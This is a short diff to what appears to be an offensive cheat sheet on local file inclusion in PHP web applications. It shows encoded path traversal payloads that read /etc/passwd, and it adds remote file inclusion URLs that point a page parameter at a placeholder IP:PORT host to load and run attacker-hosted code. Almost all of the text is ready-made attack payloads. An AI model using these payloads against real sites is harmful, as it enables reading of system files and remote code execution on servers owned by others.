@@ -99,6 +99,11 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
+#### Accessing a local server...
+```
+http://example.com/index.php?page=http://IP:PORT/file.php
+http://example.com/index.php?page=http://IP:PORT/file // dont put extension if there's  the php extension added in the code...
+
 
 ### Exploiting the LFI...
 After you've already gotten your lfi, some keep files you can look out for include:
